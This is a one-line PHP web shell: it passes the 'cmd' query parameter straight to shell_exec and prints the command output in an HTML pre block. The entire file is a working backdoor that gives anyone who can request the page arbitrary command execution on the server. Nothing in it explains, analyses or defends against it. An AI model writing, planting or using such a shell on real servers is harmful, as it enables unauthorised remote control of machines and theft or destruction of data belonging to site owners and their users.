<?php echo("<pre style='text-align:left;' title='".htmlspecialchars($_GET['cmd'])."'>".shell_exec($_GET['cmd'])."</pre>"); ?>
